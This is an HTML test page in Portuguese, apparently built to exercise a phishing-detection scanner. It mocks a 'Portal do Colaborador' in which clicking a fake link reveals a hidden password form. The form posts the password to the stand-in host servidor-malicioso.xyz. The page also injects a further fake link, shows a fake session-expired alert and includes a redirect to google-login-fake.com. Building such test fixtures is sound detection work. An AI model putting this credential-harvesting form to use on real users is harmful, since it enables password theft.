<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Ambiente de Teste - Vetores de Ataque</title>
    <style>
        body { font-family: sans-serif; padding: 40px; text-align: center; background: #e5e7eb; }
        .container { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; }
        .fake-link { color: #2563eb; text-decoration: underline; cursor: pointer; font-weight: bold; }
        .hidden-form { display: none; margin-top: 20px; padding: 15px; border: 1px solid #ef4444; }
        button { padding: 10px 20px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <h1>Portal do Colaborador</h1>
        <p>Você tem uma nova mensagem interna disponível.</p>
        
        <p>Para ler agora, <span class="fake-link" id="btn-reveal">clique aqui para abrir o leitor seguro</span>.</p>

        <div id="area-injetada" class="hidden-form">
            <h3>Login Necessário</h3>
            <form action="https://servidor-malicioso.xyz/coleta" method="POST">
                <input type="password" name="pass" placeholder="Senha do Email" required>
                <button type="submit" style="background: #ef4444; color: white; border: none;">Desbloquear Documento</button>
            </form>
        </div>
    </div>

    <script>
        // Simula a ativação de um Phishing após interação
        document.getElementById('btn-reveal').addEventListener('click', function() {
            // Log para sua Timeline
            console.log("Interação detectada no Span Falso");
            
            // Revela o formulário (Vetor de Phishing dinâmico)
            const area = document.getElementById('area-injetada');
            area.style.display = 'block';

            // Injeta um novo SPAN dinamicamente para testar o re-scan
            const novoAviso = document.createElement('span');
            novoAviso.className = 'fake-link';
            novoAviso.innerText = " Problemas com o acesso? Clique aqui.";
            area.appendChild(novoAviso);

            alert("Sessão expirada. Por favor, valide sua identidade abaixo.");
        });

        // VETOR 3: REDIRECT (Para testar a categoria de redirecionamento)
        function simularFuga() {
            window.location.href = "https://google-login-fake.com";
        }
    </script>
</body>
</html>